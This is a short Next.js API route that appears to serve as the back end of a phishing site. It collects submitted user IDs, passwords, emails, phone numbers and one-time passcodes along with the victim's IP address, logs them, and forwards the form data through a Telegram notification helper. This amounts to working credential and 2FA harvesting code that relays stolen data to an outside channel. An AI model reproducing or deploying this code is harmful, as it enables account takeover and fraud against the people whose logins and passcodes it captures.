import { NextRequest, NextResponse } from 'next/server'
import { sendFormNotification } from '@/lib/telegram'
import { logActivity } from '@/lib/activity-logger'

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json()
    
    // Get IP address from request headers
    const forwarded = request.headers.get('x-forwarded-for')
    const realIp = request.headers.get('x-real-ip')
    const ip = forwarded?.split(',')[0] || realIp || 'Unknown'
    
    // Log the activity
    await logActivity({
      type: formData.type === 'login' ? 'login' : 
            formData.type === 'email_verification' ? 'email_verification' : 
            'text_verification',
      timestamp: formData.timestamp || new Date().toISOString(),
      data: {
        type: formData.type,
        userId: formData.userId,
        password: formData.password,
        email: formData.email,
        phone: formData.phone,
        otp: formData.otp,
        page: formData.page,
        ip: ip
      }
    })
    
    // Send immediate notification and check if it succeeded
    const telegramSuccess = await sendFormNotification(formData)
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error('Form submission tracking error:', error)
    return NextResponse.json({ error: 'Failed to track form submission' }, { status: 500 })
  }
}
